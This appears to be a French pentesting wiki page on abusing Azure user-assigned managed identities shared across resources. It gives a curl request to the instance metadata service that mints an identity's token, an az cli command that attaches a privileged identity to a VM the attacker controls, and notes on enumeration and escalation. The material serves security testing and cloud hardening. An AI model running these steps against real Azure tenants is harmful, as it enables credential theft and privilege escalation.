---
title: "User-assigned : une identité partagée réutilisable entre ressources"
description: "Abuser des identités managées user-assigned partagées entre plusieurs ressources : forger leurs tokens et attacher l'identité à une ressource que vous contrôlez."
keywords:
  - user-assigned
  - identité managée
  - identité partagée
  - token
  - client id
---

# User-assigned

Une identité managée user-assigned est une ressource autonome qui peut être attachée à plusieurs ressources de compute en même temps. Cette réutilisation est le cadeau fait à l'attaquant : la même identité (et son RBAC) est accessible depuis chaque ressource à laquelle elle est liée, et elle peut être attachée à une nouvelle ressource que vous contrôlez.

## Forger un token user-assigned

```bash
# client_id selects which user-assigned identity on a multi-identity resource
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<uami-client-id>"
```

## L'attacher à une ressource que vous détenez

```bash
az vm identity assign --name <vm-you-control> -g <rg> \
  --identities /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>
# then mint its token on that VM
```

## Notes d'exploitation

- Énumérez quelles ressources partagent une identité user-assigned (Resource Graph sur `identity.userAssignedIdentities`) : compromettre l'une d'elles livre l'identité, et celle-ci peut être bien plus privilégiée que l'hôte.
- Attacher une identité user-assigned privilégiée à une ressource que vous contrôlez déjà est l'escalade par [attribution d'identité managée](../privilege-escalation/managed-identity-assignment.md) ; cette page traite de la mécanique du token et de l'angle de réutilisation.
- Vous avez besoin du `client_id` de l'identité pour la sélectionner sur une ressource qui en porte plusieurs.

## Outils

- **az cli** (`az identity list`, `az vm identity assign`).
- **Resource Graph** pour cartographier les liaisons identité-ressource.
- **BARK** pour la vue en chemins d'attaque.

## Références

- [SpecterOps : chemins d'attaque des identités managées (BARK)](https://github.com/BloodHoundAD/BARK)
- [Microsoft : identités managées user-assigned](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview)
- [HackTricks Cloud : Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
